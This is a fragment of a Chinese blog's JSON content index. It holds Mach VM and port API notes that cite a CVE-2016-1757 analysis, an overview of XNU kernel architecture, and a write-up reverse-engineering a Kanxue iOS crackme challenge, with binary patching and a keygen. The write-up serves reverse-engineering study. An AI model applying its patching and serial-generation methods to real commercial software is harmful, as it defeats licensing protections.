结束语C++这门语言是一门Magic的语言，对于程序员来说，我们似乎永远摸不清楚这门语言背着我们在干了什么。需要熟悉这门语言，我们就必需要了解C++里面的那些东西，需要去了解C++中那些危险的东西。不然，这是一种搬起石头砸自己脚的编程语言。 文章转载：http://www.cppblog.com/dawnbreak/archive/2009/03/10/76084.aspx","tags":[{"name":"C++","slug":"C","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"},{"name":"vtable","slug":"vtable","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/vtable/"}]},{"title":"Mach vm*API","date":"2017-03-04T17:51:44.000Z","path":"2017/03/05/Mach vm*API/exec函数流程/","text":"exec函数流程 mach_vm_* mach_vm_cllocate 1mach_vm_allocate(vm_map_t map,mach_vm_address_t *address,mach_vm_size_t size,int flags); 在map中分配size个字节大小的内存，根据flags的不同会有不同的处理方式。address是一个I/O的参数（例如：获取分配后的内存大小）。如果flags的值不是VM_FLAGS_ANYWHERE，那么内存将被分配到address指向的地址。 mach_vm_region123456789kern_return_tmach_vm_region( vm_map_t map, mach_vm_offset_t *address, /* IN/OUT */ mach_vm_size_t *size, /* OUT */ vm_region_flavor_t flavor, /* IN */ vm_region_info_t info, /* OUT */ mach_msg_type_number_t *count, /* IN/OUT */ mach_port_t *object_name) /* OUT */ 获取map指向的任务内，address地址起始的VM region（虚拟内存区域）的信息。目前标记为flavor只有VM_BASIC_INFO_64。获得的info的数据结构如下。12345678910struct vm_region_basic_info_64 &#123; vm_prot_t protection; vm_prot_t max_protection; vm_inherit_t inheritance; boolean_t shared; boolean_t reserved; memory_object_offset_t offset; vm_behavior_t behavior; unsigned short user_wired_count;&#125;; mach_vm_protect1234567kern_return_tmach_vm_protect( mach_port_name_t task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection) 对address到address+size这一段的内存设置内存保护策略,new_protection就是最后设置成为的保护机制。 mach_vm_write123456kern_return_tmach_vm_write( vm_map_t map, mach_vm_address_t address, pointer_t data, __unused mach_msg_type_number_t size) 对address指向的内存改写内容。 mach_vm_read1234567kern_return_t mach_vm_read( vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt); 对address指向的内存读取内容. mach_port_* mach_port_allocate12345kern_return_t mach_port_allocate( ipc_space_t task, mach_port_right_t right, mach_port_name_t *name); task指要分配端口的任务(mach_task_self())，right指分配给该端口的权限，name指代分配端口名的地址Ports有如下权限，Ports可以在不同的task之间传递，通过传递可以赋予其他task对ports的操作权限。例如POC中使用的就是在父进程与子进程之间传递Port得到了对内存操作的权限。 1234567#define MACH_PORT_RIGHT_SEND ((mach_port_right_t) 0)#define MACH_PORT_RIGHT_RECEIVE ((mach_port_right_t) 1)#define MACH_PORT_RIGHT_SEND_ONCE ((mach_port_right_t) 2)#define MACH_PORT_RIGHT_PORT_SET ((mach_port_right_t) 3)#define MACH_PORT_RIGHT_DEAD_NAME ((mach_port_right_t) 4)#define MACH_PORT_RIGHT_LABELH ((mach_port_right_t) 5)#define MACH_PORT_RIGHT_NUMBER ((mach_port_right_t) 6) mach_port_insert_right123456kern_return_t mach_port_insert_right( ipc_space_t task, mach_port_name_t name, mach_port_t poly, mach_msg_type_name_t polyPoly); 参考 http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/ https://developer.apple.com","tags":[{"name":"macOS内核","slug":"macOS内核","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/macOS内核/"},{"name":"mach","slug":"mach","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/mach/"},{"name":"vm","slug":"vm","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/vm/"}]},{"title":"macOS内核知识点整理","date":"2016-12-05T16:34:52.000Z","path":"2016/12/06/macOS内核框架/macOS内核架构-功能/","text":"Darwin结构 沙盒结构 XNU源码树 目录 包含的内容 bsd 内核的BSD组件 config 各种框架的导出符号 iokit I/OKit驱动程序运行时子系统 libkern 内核主运行时库API osfmk 内核的Mach组件 pexpert 平台相关的服务（PPC,i386） security BSD MAC框架 BSD子目录 子目录 包含的内容 bsm/security Basic Security Module(审计子系统) conf 机器相关的Makefile crypto 对称加密算法和散列算法的实现 dev BSD设备（/dev目录项） hfs macOS默认文件系统（HFS/HFS+） i386/machine Intel/PPC架构的私有头文件 kern 内核的主要代码 libkern 内核运行时导出的库（CRC,字符串函数等） man 一些有用的man手册 net*/netinet 网络子系统（套接字）和IP协议栈 nfs 用于远程文件系统的NFSv3协议栈 sys 内核头文件 vfs 虚拟文件系统交换（Virtual Filesystem Switch） vm BSD的虚拟内存处理程序 osfmk子目录 子目录 包含的内容 chud Computer Hardware Understanding Development(为macOS诊断工具提供内核支持) conf 机器相关的Makefile console 控制台初始化,串口,引导视频和内核崩溃 ddb 内核调试器（已弃用） default_pager VM分页器 device Mach对I/OKit和设备的支持 i386/ppc/x86_64 CPU特定的实现 ipc IPC,port和消息 kdp KDP(调试器)支持 mach,machine Mach通用头文件和机器相关的内核头文件 man 唯一涉及到Mach调用的man手册 pmc/profiling PMC性能检测 UserNotification 内核到用户态的通知 vm 虚拟内存的实现和头文件 the xnu Kernal of following component Mach servers layer BSD primary systerm programming interface provide The I/OKit runtime environment for drivers libkernal in* kernel library libsaan in* kernel library that is normally used only during early systerm startup the platform expert hardware abstraction module kernel extension various I/OKit family,the majority of loadable device drivers,and some non* I/O Kit extention MachIf the xnu kernel is the core of Mac OS X, then Mach may be considered the core of xnu. hardware abstraction to some extent processor management including symmetric mutiprocessing * and scheduling Preemptive multitasking, including support for tasks and threads Virtual memory management, including low-level paging, memory protection, sharing, and inheritance$Low-level IPC mechanisms that are the basis for all messaging in the kernel Real-time support that allows time-sensitive applications (e.g., media applications such asGarageBand and iTunes) to have latency-bounded access to processor resources Kernel debugging support Console I/O BSD BSD-style process model Signals User IDs, permissions, and basic security policies POSIX APIs Asynchronous I/O APIs (AIO) BSD-style system calls TCP/IP stack, BSD sockets, and firewalling Network Kernel Extensions (NKEs), a type of kernel extension for making the BSD networking architecture fit into xnu[11] The virtual file system (VFS) layer and numerous file systems, including a file-system-independent VFS-level journaling mechanism System V and POSIX interprocess communication mechanisms In-kernel cryptographic framework A system notification mechanism based on FreeBSD’s kqueue/kevent mechanism, which is a system-wide service enabling notifications between applications, and from the kernel to applications The fsevents file system change notification mechanism that is used by the Spotlight search technology Access control lists (ACLs) and the kauth authorization framework Various synchronization primitives The I/O Kit Extensive programming interfaces, including interfaces for applications and user* space drivers to communicate with the I/O Kit Numerous device families such as ATA/ATAPI, FireWire, Graphics, HID, Network, PCI, and USB Object* oriented abstractions of devices Plug-and-play and dynamic device management (“hot-plugging”) Power management Preemptive multitasking, threading, symmetric multiprocessing, memory protection, and data management Dynamic matching and loading of drivers for multiple bus types A database for tracking and maintaining detailed information on instantiated objects (the I/O Registry) A database of all I/O Kit classes available on a system (the I/O Catalog)Interfaces for applications and user-space drivers to communicate with the I/O Kit Driver stacking The libkern Library Dynamic allocation, construction, and destruction objects, with support for a variety of built-in object types such as Arrays, Booleans, and Dictionaries Atomic operations and miscellaneous functions such as bcmp(), memcmp(), and strlen() Functions for byte-swapping Provisions for tracking the number of current instances for each class Mechanisms that help alleviate the C++ fragile base-class problem The libsa Librarylibsa is an in-kernel support library essentially an in* kernel linkerused during early system startup for loading kernel extensions,sa=stand-alone,Mac OS X kernel extensions are normally loaded on demand through the kexTD user-space daemon (/usr/libexec/kextd). During early stages of bootstrapping, kextd is not yet available. libsa provides a subset of kextd’s capabilities to the kernel. Examples of specific functionality implemented by libsa for loading, linking, and recording kernel extension object files include the following: Simple memory allocation Binary searching Sorting Miscellaneous string* handling functions  Symbol remangling A dependency graph package used while determining kernel extension dependencies Decompression of compressed kernels and verification of checksums The Platform ExpertNubs[In the context of the I/O Kit, a nub is an object that defines an access point and communication channel for a physical device or a logical service. A physical device could be a bus, a disk drive or partition, a graphics card, and so on. Examples of logical services include arbitration, driver matching, and power management.] Constructing device trees Parsing certain boot arguments Identifying the machine, which includes determining processor and bus clock speeds  Accessing power management information Retrieving and setting system time Retrieving and setting console information Halting and restarting the machine Accessing the interrupt controller Creating the system serial number string Saving kernel panic information Initializing a “user interface” to be used in case of kernel panics Reading and writing the nonvolatile memory (NVRAM) Reading and writing the parameter memory (PRAM) task and thread任务是一个包含一个或多个可执行线程的任务组，这些线程共享资源和内存空间。Mach的任务是将一对一映射到Unix BSD层的进程。XNU内核也是一个包含多个线程的任务。","tags":[{"name":"xnu","slug":"xnu","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/xnu/"},{"name":"macos内核","slug":"macos内核","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/macos内核/"},{"name":"BSD","slug":"BSD","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/BSD/"}]},{"title":"看雪iOSCrackme破解报告","date":"2016-08-04T17:51:44.000Z","path":"2016/08/05/iOSCrackme/iOSCrackme/","text":"看雪iOSCrackme破解报告0x01.首先，利用classdump把crackme的头文件导出来，可以看到头文件只有6个，根据屏幕上的check按钮，很容易在控制器中找到如下函数 0x02.然后将可执行文件拉入IDA分析，直接跳到check这个函数。可以猜测这个函数应该就是加密函数。下面重点对这个函数进行详细分析。 0x03.在分析之前，先在手机屏幕上直接点击check，无反应。然后输入一定字符后再点击check，仍然没有反应。没有一点的错误提示，看来只能一步一步看汇编了。在IDA中先大概看下流程图的结构，拉到最底下，发现貌似成功的界面 不管怎样，先试试直接跳转到该地址，看能不能弹出成功的界面？: / 修改为B 0x0000C1AC 然后再屏幕上点击check，成功弹出welcome to kanxue的界面！再接再厉,看看中间都经历了什么步骤。 0x04.下面进入汇编，第一阶段，根据strlen函数很容易知道，这是在对用户输入的字符串进行长度判断，若不满足情况，直接跳到失败代码。name为14位，serialnumber为8位 既然是逆向工程，所以先分析下在弹出这个界面前的代码都在做写些什么,r11为我们输入的serialnumber然后可以发现如果栈中的值和serialnumber8次匹配成功就会弹出成功的界面。 0x05.一段插曲，不知道是程序自身的原因还是手机的问题，在一步步向下调试的时候，发现内存非法访问，为什么会出现这个问题呢？向上找的时候，发现这样一条指令MOV PC, PC按理说，根据arm处理器流水线的处理机制，PC会指向当前的下面两条指令，所以执行这条语句后应该会跳到VDUP.8 Q9, R1指令. 但是实际情况却是把拆成四条指令，并把r0的值变为了0，导致r2变化，从而非法访问了r2地址的内存。 所以为了让r0的值不改变,之前都是通过每次动态修register write $r0的值，导致每次调试都要在那两处下个断点，浪费了很多时间。后来直接把静态修改重新打包安装到手机，lsls r0 r0改为nop代替，同理下面还有一处，作相应的修改。 0x06.回到我们之前的分析，现在开始加密阶段，首先进入的是下面的一个循环 r0的值为栈中的某个地址，d18-d19的值为00-0f，然后循环了16次，每次都对d18-d19加一，所以循环结束后在栈中生成了一个16*16大小的矩阵，且值为00-ff. 0x07.接着往下面分析，又是一个循环。循环了256次，可以猜测应该是对上面的矩阵进行变换，分析可以发现这个循环通过r9(0xaaaaaaab)和r1相乘结果来对矩阵中的值进行交换。 在循环的结束的下一条地址下个断点，打印对应的内存，验证了我们的猜想。 我们之前的分析中好像还没有和我们输入的name和serialnumber有什么联系。接着分析，这个循环终于对name进行了存取操作，通过四次循环把name的前四位取出来与之前的矩阵加密后又放回到name的前四位。 内存图： 下面这一段有点繁琐，各种跳转，但是并不复杂，就是通过判断加密后的name的长度然后复制到栈中地址r8处。 接着又是一个循环，分析可知是对r8即刚才复制加密name后的内存进行每四位反序变换。 内存图： keep going！这一段不是很复杂，就是把刚才变换后的首地址r8向下的64个字节复制到内存栈中[sp 0x50]处。后来得知从这个地址到r8后的内存就是整个栈变化的结束，后面的四个循环并没有进行栈的存操作，只是将这块内存的值取出来加密。 内存图： 下面的四个循环很相似，都是将那块内存每次提取80个字节进行加密。刚好有80*4=320与内存块的字节数相同。 然后将这之后的寄存器值与对应的值相加spintf按%08x%08x%08x%08x%08x的格式写入栈。 最后对栈进行了5次存储，与后面分析可知这段内存就会与serialnumber进行匹配。 0x07.根据上面的步骤写出代码，注册机为一个命令行程序，运行程序会提示如数14位的字母和数字的字符串，然后根据此就会生成对应的serialnumber。效果图如下： 在手机中输入生成的name和serialnumber弹出成功的界面！","tags":[{"name":"Crackme","slug":"Crackme","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Crackme/"},{"name":"看雪","slug":"看雪","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/看雪/"},{"name":"iOS","slug":"iOS","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iOS/"}]}]